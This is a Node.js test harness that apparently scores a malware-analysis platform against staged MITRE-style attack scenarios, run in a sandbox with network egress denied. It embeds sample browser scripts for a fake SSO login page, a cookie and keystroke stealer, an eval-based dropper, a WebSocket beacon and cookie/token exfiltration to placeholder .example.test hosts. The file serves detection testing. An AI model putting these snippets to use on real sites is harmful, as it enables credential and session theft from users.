#!/usr/bin/env node
/**
 * Attack Simulation Range — deterministic MITRE-style scenario engine.
 *
 * Each scenario is an ordered kill-chain of attack stages. A stage carries the
 * inline script an adversary would run at that step plus an explicit, reviewable
 * expectation (verdict level, verdict score floor, techniques, IOC hosts,
 * kill-chain stages and network volume). The engine executes every stage in a
 * fresh traceless sandbox with egress denied, then scores the platform against
 * the expectation. Nothing is randomised: the same seed yields the same
 * scorecard, so a regression in detection shows up as a red check.
 *
 *   list / run [--scenario id] [--scenario-file path] [--json] / --self-test
 */
import { readFile } from 'node:fs/promises'
import { analyzeSample } from '../../../tools/index.js'

/** Inline stage scripts. Kept as constants so scenarios stay declarative. */
export const STAGE_SAMPLES = Object.freeze({
  'phishing-lure': `var lure = atob('PGRpdiBjbGFzcz0ic3NvIj48aW5wdXQgbmFtZT0icGFzcyI+PC9kaXY+');
document.write(lure);
var form = document.createElement('form');
form.action = 'https://sso-verify.example.test/collect';
form.method = 'POST';
document.body.appendChild(form);
var field = document.createElement('input');
field.name = 'password';
form.appendChild(field);
navigator.sendBeacon('https://sso-verify.example.test/collect', 'user=victim&pass=Winter2024!');`,

  'credential-collect': `var stolen = { cookie: document.cookie, token: localStorage.getItem('session') };
var keylog = '';
document.addEventListener('keydown', function (event) { keylog += event.key; });
localStorage.setItem('harvest', JSON.stringify(stolen));
fetch('https://sso-verify.example.test/collect', { method: 'POST', body: JSON.stringify(stolen) }).catch(function () {});`,

  'script-execution': `var payload = atob('Y29uc29sZS5sb2coImRyb3BwZXIiKQ==');
eval(payload);
var worker = new Worker('https://cdn.polyfill.example.test/loader.js');
document.write('<iframe src="about:blank"></iframe>');`,

  'c2-beacon': `var socket = new WebSocket('wss://beacon.example.test/gate');
socket.onopen = function () { socket.send(JSON.stringify({ id: 'h1', op: 'checkin' })); };
setInterval(function () { fetch('https://beacon.example.test/task').catch(function () {}); }, 5000);`,

  'exfil-stage': `var stash = { cookies: document.cookie, token: localStorage.getItem('session') };
var blob = JSON.stringify(stash);
navigator.sendBeacon('https://exfil.example.test/dump', blob);
fetch('https://exfil.example.test/dump', { method: 'POST', body: blob }).catch(function () {});
var image = new Image();
image.src = 'https://exfil.example.test/pixel?d=' + encodeURIComponent(blob.slice(0, 64));`,
})

const EXPECT_BASELINE = Object.freeze({ verdictIn: ['suspicious', 'malicious'], disposalRequired: true })

/**
 * Built-in range. `expect.minScore` sits a few points under the measured
 * platform score so small heuristic tuning does not break the range, while a
 * genuine detection regression still fails the stage.
 */
export const SCENARIOS = Object.freeze([
  Object.freeze({
    id: 'credential-phish',
    name: '凭据钓鱼套件（Credential Phishing Kit）',
    description: '仿冒 SSO 登录页诱导输入凭据，再把 cookie/键盘记录回传攻击者收集端。',
    tactics: ['initial-access', 'credential-access'],
    allowlist: ['sso-verify.example.test'],
    stages: [
      Object.freeze({
        id: 'phish-page',
        name: '仿冒登录页投递',
        technique: 'T1566.002',
        tactic: 'initial-access',
        sample: STAGE_SAMPLES['phishing-lure'],
        expect: Object.freeze({
          ...EXPECT_BASELINE,
          minScore: 22,
          techniques: ['dom-injection', 'encoded-string-decoding'],
          iocHosts: ['sso-verify.example.test'],
          killChain: ['injection'],
          minNetworkEvents: 1,
        }),
      }),
      Object.freeze({
        id: 'credential-harvest',
        name: '凭据与键盘记录采集',
        technique: 'T1056.003',
        tactic: 'credential-access',
        sample: STAGE_SAMPLES['credential-collect'],
        expect: Object.freeze({
          ...EXPECT_BASELINE,
          minScore: 24,
          techniques: ['web-storage'],
          iocHosts: ['sso-verify.example.test'],
          killChain: ['command-and-control'],
          minNetworkEvents: 1,
        }),
      }),
    ],
  }),
  Object.freeze({
    id: 'full-killchain',
    name: '完整杀伤链：钓鱼 → 执行 → C2 → 外传',
    description: '从投递诱饵到数据外传的四段式杀伤链，逐段检查平台的检测、IOC 提取与沙箱销毁。',
    tactics: ['initial-access', 'execution', 'command-and-control', 'exfiltration'],
    allowlist: ['sso-verify.example.test', 'cdn.polyfill.example.test', 'beacon.example.test', 'exfil.example.test'],
    stages: [
      Object.freeze({
        id: 'phish-page',
        name: '仿冒登录页投递',
        technique: 'T1566.002',
        tactic: 'initial-access',
        sample: STAGE_SAMPLES['phishing-lure'],
        expect: Object.freeze({
          ...EXPECT_BASELINE,
          minScore: 22,
          techniques: ['dom-injection'],
          iocHosts: ['sso-verify.example.test'],
          minNetworkEvents: 1,
        }),
      }),
      Object.freeze({
        id: 'dropper-exec',
        name: '解码并执行 dropper',
        technique: 'T1059.007',
        tactic: 'execution',
        sample: STAGE_SAMPLES['script-execution'],
        expect: Object.freeze({
          ...EXPECT_BASELINE,
          minScore: 28,
          techniques: ['dynamic-code-execution', 'encoded-string-decoding', 'worker-thread'],
          iocHosts: ['cdn.polyfill.example.test'],
          killChain: ['execution'],
        }),
      }),
      Object.freeze({
        id: 'c2-beacon',
        name: 'WebSocket 回连与任务轮询',
        technique: 'T1071.001',
        tactic: 'command-and-control',
        sample: STAGE_SAMPLES['c2-beacon'],
        expect: Object.freeze({
          ...EXPECT_BASELINE,
          minScore: 30,
          techniques: ['network-communication'],
          iocHosts: ['beacon.example.test'],
          killChain: ['command-and-control'],
          minNetworkEvents: 3,
        }),
      }),
      Object.freeze({
        id: 'exfil-dump',
        name: '会话数据外传',
        technique: 'T1041',
        tactic: 'exfiltration',
        sample: STAGE_SAMPLES['exfil-stage'],
        expect: Object.freeze({
          ...EXPECT_BASELINE,
          minScore: 28,
          techniques: ['network-communication', 'web-storage'],
          iocHosts: ['exfil.example.test'],
          killChain: ['command-and-control'],
          minNetworkEvents: 1,
        }),
      }),
    ],
  }),
  Object.freeze({
    id: 'beacon-and-exfil',
    name: '无投递链路：回连 + 外传',
    description: '假定初始访问已在范围外完成，只验证 C2 与外传两段的检测能力。',
    tactics: ['command-and-control', 'exfiltration'],
    allowlist: ['beacon.example.test', 'exfil.example.test'],
    stages: [
      Object.freeze({
        id: 'c2-beacon',
        name: 'WebSocket 回连与任务轮询',
        technique: 'T1071.001',
        tactic: 'command-and-control',
        sample: STAGE_SAMPLES['c2-beacon'],
        expect: Object.freeze({
          ...EXPECT_BASELINE,
          minScore: 30,
          techniques: ['network-communication'],
          iocHosts: ['beacon.example.test'],
          minNetworkEvents: 3,
        }),
      }),
      Object.freeze({
        id: 'exfil-dump',
        name: '会话数据外传',
        technique: 'T1041',
        tactic: 'exfiltration',
        sample: STAGE_SAMPLES['exfil-stage'],
        expect: Object.freeze({
          ...EXPECT_BASELINE,
          minScore: 28,
          techniques: ['web-storage'],
          iocHosts: ['exfil.example.test'],
          minNetworkEvents: 1,
        }),
      }),
    ],
  }),
])

const SCENARIO_FIELDS = ['id', 'name', 'description', 'tactics', 'allowlist', 'stages']
const STAGE_FIELDS = ['id', 'name', 'technique', 'tactic', 'sample', 'expect']

/** Validate a scenario loaded from disk; the range must never run a typo silently. */
export function validateScenario(scenario) {
  if (!scenario || typeof scenario !== 'object') throw new Error('scenario must be an object')
  for (const field of SCENARIO_FIELDS) {
    if (!(field in scenario)) throw new Error(`scenario is missing field ${field}`)
  }
  if (!/^[a-z0-9-]+$/.test(scenario.id)) throw new Error(`scenario id ${scenario.id} must be kebab-case`)
  if (!Array.isArray(scenario.stages) || scenario.stages.length === 0) throw new Error(`scenario ${scenario.id} has no stages`)
  if (!Array.isArray(scenario.allowlist)) throw new Error(`scenario ${scenario.id} allowlist must be an array`)
  const seen = new Set()
  for (const stage of scenario.stages) {
    for (const field of STAGE_FIELDS) {
      if (!(field in stage)) throw new Error(`stage in ${scenario.id} is missing field ${field}`)
    }
    if (seen.has(stage.id)) throw new Error(`duplicate stage id ${stage.id} in ${scenario.id}`)
    seen.add(stage.id)
    if (typeof stage.sample !== 'string' || stage.sample.trim().length === 0) throw new Error(`stage ${stage.id} has an empty sample`)
    if (!/^T\d{4}(\.\d{3})?$/.test(stage.technique)) throw new Error(`stage ${stage.id} technique ${stage.technique} is not a MITRE id`)
    const expect = stage.expect
    if (!expect || typeof expect !== 'object') throw new Error(`stage ${stage.id} has no expectation`)
    if (!Array.isArray(expect.verdictIn) || expect.verdictIn.length === 0) throw new Error(`stage ${stage.id} needs verdictIn`)
    for (const list of ['techniques', 'iocHosts', 'killChain']) {
      if (expect[list] !== undefined && !Array.isArray(expect[list])) throw new Error(`stage ${stage.id} ${list} must be an array`)
    }
    if (expect.minScore !== undefined && !Number.isFinite(expect.minScore)) throw new Error(`stage ${stage.id} minScore must be a number`)
    if (expect.minNetworkEvents !== undefined && !Number.isFinite(expect.minNetworkEvents)) throw new Error(`stage ${stage.id} minNetworkEvents must be a number`)
  }
  return scenario
}

/** Reduce a platform report to the observables the range asserts on. */
export function observeStage(report, run = null) {
  const hosts = [...new Set((report.static.iocs?.urls ?? []).map((url) => url.host).filter(Boolean))].sort()
  const network = (report.dynamic.behavior?.network ?? []).filter((event) => typeof event?.url === 'string')
  return {
    verdict: report.verdict.level,
    score: report.verdict.score,
    families: [...report.verdict.families].sort(),
    techniques: [...report.static.techniques].sort(),
    iocHosts: hosts,
    iocCount: Object.values(report.static.iocs ?? {}).reduce((total, group) => total + (Array.isArray(group) ? group.length : 0), 0),
    killChain: [...new Set((report.dynamic.behavior?.killChain ?? []).map((stage) => stage.stage))].sort(),
    networkEvents: network.length,
    networkUrls: [...new Set(network.map((event) => event.url).filter((url) => /^(?:https?|wss?):\/\//.test(url)))].sort(),
    artifacts: report.artifacts.length,
    disposalOk: run?.disposal?.ok === true,
  }
}

/**
 * Evaluate one expectation against one observation.
 * Every check is recorded, not just the failures: the scorecard is the evidence.
 */
export function evaluateStage(expect, observed) {
  const checks = []
  const push = (id, ok, expected, actual) => checks.push({ id, ok, expected, actual })
  push('verdict', expect.verdictIn.includes(observed.verdict), expect.verdictIn.join('|'), observed.verdict)
  if (expect.minScore !== undefined) push('score', observed.score >= expect.minScore, `>=${expect.minScore}`, observed.score)
  for (const technique of expect.techniques ?? []) {
    push(`technique:${technique}`, observed.techniques.includes(technique), technique, observed.techniques.join(','))
  }
  for (const host of expect.iocHosts ?? []) {
    push(`ioc:${host}`, observed.iocHosts.includes(host), host, observed.iocHosts.join(','))
  }
  for (const stage of expect.killChain ?? []) {
    push(`killchain:${stage}`, observed.killChain.includes(stage), stage, observed.killChain.join(','))
  }
  if (expect.minNetworkEvents !== undefined) {
    push('network-events', observed.networkEvents >= expect.minNetworkEvents, `>=${expect.minNetworkEvents}`, observed.networkEvents)
  }
  if (expect.disposalRequired !== false) push('disposal', observed.disposalOk, true, observed.disposalOk)
  return checks
}

function median(values) {
  if (values.length === 0) return 0
  const sorted = [...values].sort((a, b) => a - b)
  const middle = Math.floor(sorted.length / 2)
  return sorted.length % 2 === 0 ? (sorted[middle - 1] + sorted[middle]) / 2 : sorted[middle]
}

/**
 * Run one scenario end to end.
 * @param {object} scenario
 * @param {{seed?: number, timeoutMs?: number, sandbox?: object}} [options]
 */
export async function runScenario(scenario, options = {}) {
  validateScenario(scenario)
  const seed = options.seed ?? 0x5eed
  const stages = []
  for (const stage of scenario.stages) {
    const result = await analyzeSample(stage.sample, {
      name: `${scenario.id}/${stage.id}.js`,
      logLevel: 'silent',
      seed,
      limits: { timeoutMs: options.timeoutMs ?? 2500 },
      network: { policy: 'deny' },
    })
    const observed = observeStage(result.report, result.run)
    const checks = evaluateStage(stage.expect, observed)
    stages.push({
      id: stage.id,
      name: stage.name,
      technique: stage.technique,
      tactic: stage.tactic,
      verdict: observed.verdict,
      score: observed.score,
      techniques: observed.techniques,
      iocHosts: observed.iocHosts,
      killChain: observed.killChain,
      networkEvents: observed.networkEvents,
      networkUrls: observed.networkUrls,
      artifacts: observed.artifacts,
      disposalOk: observed.disposalOk,
      checks,
      passed: checks.every((check) => check.ok),
    })
  }

  const checks = stages.flatMap((stage) => stage.checks)
  const passed = checks.filter((check) => check.ok)
  const expectedHosts = [...new Set(scenario.stages.flatMap((stage) => stage.expect.iocHosts ?? []))].sort()
  const foundHosts = [...new Set(stages.flatMap((stage) => stage.iocHosts))].sort()
  const allowlist = new Set([...scenario.allowlist, ...expectedHosts])
  const unexpectedHosts = foundHosts.filter((host) => !allowlist.has(host))
  const detectedStages = stages.filter((stage) => stage.verdict !== 'benign').length
  const expectationsMet = checks.length === 0 ? 0 : Math.round((passed.length / checks.length) * 100)
  const coverage = stages.length === 0 ? 0 : Math.round((detectedStages / stages.length) * 100)

  return {
    scenario: {
      id: scenario.id,
      name: scenario.name,
      description: scenario.description,
      tactics: [...scenario.tactics],
    },
    stages,
    totals: {
      stages: stages.length,
      checks: checks.length,
      checksPassed: passed.length,
      expectationsMet,
      detectedStages,
      detectionCoverage: coverage,
      meanVerdictScore: stages.length === 0 ? 0 : Math.round(stages.reduce((sum, stage) => sum + stage.score, 0) / stages.length),
      medianVerdictScore: median(stages.map((stage) => stage.score)),
      maliciousVerdicts: stages.filter((stage) => stage.verdict === 'malicious').length,
      suspiciousVerdicts: stages.filter((stage) => stage.verdict === 'suspicious').length,
    },
    iocs: {
      expected: expectedHosts,
      found: foundHosts,
      missing: expectedHosts.filter((host) => !foundHosts.includes(host)),
      unexpected: unexpectedHosts,
    },
    failedChecks: checks.filter((check) => !check.ok),
    passed: checks.every((check) => check.ok),
  }
}

/**
 * Run a set of scenarios and aggregate the range scorecard.
 * @param {{scenarios?: object[], seed?: number}} [options]
 */
export async function runRange(options = {}) {
  const scenarios = options.scenarios ?? SCENARIOS
  const scorecards = []
  for (const scenario of scenarios) scorecards.push(await runScenario(scenario, options))
  const checks = scorecards.reduce((total, card) => total + card.totals.checks, 0)
  const passed = scorecards.reduce((total, card) => total + card.totals.checksPassed, 0)
  const stages = scorecards.reduce((total, card) => total + card.totals.stages, 0)
  const detected = scorecards.reduce((total, card) => total + card.totals.detectedStages, 0)
  return {
    scorecards,
    totals: {
      scenarios: scorecards.length,
      stages,
      checks,
      checksPassed: passed,
      failedScenarios: scorecards.filter((card) => !card.passed).length,
      expectationsMet: checks === 0 ? 0 : Math.round((passed / checks) * 100),
      detectionCoverage: stages === 0 ? 0 : Math.round((detected / stages) * 100),
      meanVerdictScore: stages === 0 ? 0 : Math.round(scorecards.reduce((sum, card) => sum + card.totals.meanVerdictScore * card.totals.stages, 0) / stages),
    },
    iocs: {
      hosts: [...new Set(scorecards.flatMap((card) => card.iocs.found))].sort(),
      unexpected: [...new Set(scorecards.flatMap((card) => card.iocs.unexpected))].sort(),
    },
    passed: scorecards.every((card) => card.passed),
    networkPolicy: 'deny',
  }
}

/** Plain-text scorecard for a terminal or a CI log. */
export function renderScorecard(card) {
  const lines = []
  lines.push(`场景 ${card.scenario.id} — ${card.scenario.name}`)
  lines.push(`战术链: ${card.scenario.tactics.join(' -> ')}`)
  const header = ['STAGE', 'TECHNIQUE', 'VERDICT', 'SCORE', 'CHECKS', 'RESULT']
  const rows = card.stages.map((stage) => [
    stage.id,
    stage.technique,
    stage.verdict,
    String(stage.score),
    `${stage.checks.filter((check) => check.ok).length}/${stage.checks.length}`,
    stage.passed ? 'PASS' : 'FAIL',
  ])
  const widths = header.map((title, index) => Math.max(title.length, ...rows.map((row) => row[index].length)))
  const line = (cells) => cells.map((cell, index) => cell.padEnd(widths[index])).join('  ')
  lines.push(line(header))
  lines.push(widths.map((width) => '-'.repeat(width)).join('  '))
  for (const row of rows) lines.push(line(row))
  if (card.failedChecks.length > 0) {
    lines.push('失败断言:')
    for (const check of card.failedChecks) {
      lines.push(`  - ${check.id}: 期望 ${check.expected} 实际 ${check.actual}`)
    }
  }
  lines.push(
    `期望达成 ${card.totals.expectationsMet}% (${card.totals.checksPassed}/${card.totals.checks}) | 检测覆盖 ${card.totals.detectionCoverage}% | 平均判定分 ${card.totals.meanVerdictScore}`,
  )
  lines.push(`IOC 主机: ${card.iocs.found.join(', ') || '—'}`)
  if (card.iocs.unexpected.length > 0) lines.push(`意外 IOC: ${card.iocs.unexpected.join(', ')}`)
  return lines.join('\n')
}

export async function loadScenario(file) {
  const raw = JSON.parse(await readFile(file, 'utf8'))
  const scenario = raw.scenario ?? raw
  if (!Array.isArray(scenario.stages)) throw new Error(`${file} does not contain a scenario`)
  return validateScenario({
    ...scenario,
    stages: scenario.stages.map((stage) => ({ ...stage, expect: { ...EXPECT_BASELINE, ...stage.expect } })),
  })
}

async function selfTest() {
  const card = await runScenario(SCENARIOS.find((scenario) => scenario.id === 'full-killchain'))
  if (card.stages.length !== 4) throw new Error(`full-killchain must have 4 stages, got ${card.stages.length}`)
  if (!card.passed) throw new Error(`full-killchain failed: ${JSON.stringify(card.failedChecks)}`)
  if (card.totals.expectationsMet !== 100) throw new Error(`expectations ${card.totals.expectationsMet}%`)
  if (card.totals.detectionCoverage !== 100) throw new Error(`coverage ${card.totals.detectionCoverage}%`)
  if (card.totals.maliciousVerdicts + card.totals.suspiciousVerdicts !== 4) throw new Error('every stage must be detected')
  if (!card.iocs.found.includes('beacon.example.test')) throw new Error('C2 host missing from IOC roll-up')
  if (!card.iocs.found.includes('exfil.example.test')) throw new Error('exfil host missing from IOC roll-up')
  if (card.iocs.unexpected.length !== 0) throw new Error(`unexpected IOCs ${card.iocs.unexpected}`)
  for (const stage of card.stages) {
    if (!stage.disposalOk) throw new Error(`stage ${stage.id} leaked a sandbox`)
    if (!stage.networkUrls.every((url) => /example\.test/.test(url))) throw new Error(`stage ${stage.id} contacted a non-range host`)
  }
  const ordered = card.stages.map((stage) => stage.tactic)
  if (ordered.join(',') !== 'initial-access,execution,command-and-control,exfiltration') throw new Error(`kill-chain order ${ordered}`)

  const phish = await runScenario(SCENARIOS.find((scenario) => scenario.id === 'credential-phish'))
  if (!phish.passed) throw new Error(`credential-phish failed: ${JSON.stringify(phish.failedChecks)}`)
  if (phish.totals.stages !== 2) throw new Error('credential-phish must have 2 stages')
  if (!phish.iocs.found.includes('sso-verify.example.test')) throw new Error('phish host missing')

  // Negative path: an impossible expectation must fail loudly and name the check.
  const impossible = {
    id: 'negative-control',
    name: 'negative control',
    description: 'expectation that cannot be met',
    tactics: ['execution'],
    allowlist: [],
    stages: [
      {
        id: 'impossible',
        name: 'impossible stage',
        technique: 'T1059.007',
        tactic: 'execution',
        sample: STAGE_SAMPLES['script-execution'],
        expect: { ...EXPECT_BASELINE, minScore: 99, iocHosts: ['nowhere.example.test'] },
      },
    ],
  }
  const failed = await runScenario(impossible)
  if (failed.passed) throw new Error('negative control unexpectedly passed')
  if (failed.totals.expectationsMet >= 100) throw new Error('failed checks did not lower the score')
  const failedIds = failed.failedChecks.map((check) => check.id).sort()
  if (!failedIds.includes('score') || !failedIds.includes('ioc:nowhere.example.test')) {
    throw new Error(`failed checks ${failedIds.join(',')}`)
  }
  if (failed.iocs.unexpected.length !== 1 || !failed.iocs.unexpected.includes('cdn.polyfill.example.test')) {
    throw new Error(`unexpected IOC tracking misfired: ${failed.iocs.unexpected.join(',')}`)
  }

  const range = await runRange()
  if (range.totals.scenarios !== SCENARIOS.length) throw new Error('range did not run every scenario')
  if (!range.passed) throw new Error('range failed on the built-in scenarios')
  if (range.networkPolicy !== 'deny') throw new Error('range must run with egress denied')
  if (range.totals.failedScenarios !== 0) throw new Error('range reported failed scenarios')

  const rendered = renderScorecard(card)
  if (!rendered.includes('PASS') || !rendered.includes('T1071.001')) throw new Error('scorecard rendering incomplete')

  console.log(
    `range: scenarios=${range.totals.scenarios} stages=${range.totals.stages} checks=${range.totals.checksPassed}/${range.totals.checks} coverage=${range.totals.detectionCoverage}% negative=${failedIds.length} iocs=${range.iocs.hosts.length}`,
  )
  console.log(`full-killchain scores: ${card.stages.map((stage) => `${stage.id}=${stage.score}`).join(' ')}`)
  console.log('SELFTEST OK')
}

function option(args, name, fallback) {
  const index = args.indexOf(name)
  return index >= 0 && args[index + 1] ? args[index + 1] : fallback
}

async function main() {
  const argv = process.argv.slice(2)
  const command = argv[0]
  if (command === '--self-test') return selfTest()
  if (!command || command === '--help') {
    console.log(
      [
        'Attack Simulation Range',
        '  list                              列出内置场景',
        '  run [--scenario id] [--json]      运行场景并输出记分卡',
        '  run --scenario-file path          运行外部场景（JSON）',
        '  --self-test',
      ].join('\n'),
    )
    if (!command) process.exitCode = 2
    return
  }
  if (command === 'list') {
    for (const scenario of SCENARIOS) {
      console.log(`${scenario.id.padEnd(18)} ${String(scenario.stages.length).padStart(2)} stages  ${scenario.tactics.join(' -> ')}`)
      console.log(`${''.padEnd(18)} ${scenario.name}`)
    }
    console.log(`${SCENARIOS.length} scenario(s)`)
    return
  }
  if (command !== 'run') throw new Error(`unknown command ${command}`)
  const seed = Number(option(argv, '--seed', '24301'))
  let scenarios = SCENARIOS
  const only = option(argv, '--scenario', null)
  if (only) {
    scenarios = SCENARIOS.filter((scenario) => scenario.id === only)
    if (scenarios.length === 0) throw new Error(`unknown scenario ${only}`)
  }
  const scenarioFile = option(argv, '--scenario-file', null)
  if (scenarioFile) scenarios = [await loadScenario(scenarioFile)]
  const card = await runRange({ scenarios, seed })
  if (argv.includes('--json')) {
    console.log(JSON.stringify(card, null, 2))
  } else {
    for (const scorecard of card.scorecards) {
      console.log(renderScorecard(scorecard))
      console.log('')
    }
    console.log(
      `range: ${card.totals.scenarios} scenario(s) | 断言 ${card.totals.checksPassed}/${card.totals.checks} | 覆盖 ${card.totals.detectionCoverage}% | IOCs ${card.iocs.hosts.join(', ') || '—'}`,
    )
  }
  if (!card.passed) process.exitCode = 1
}

if (import.meta.url === `file://${process.argv[1]}`) {
  main().catch((error) => {
    console.error(`error: ${error.message}`)
    process.exitCode = 1
  })
}
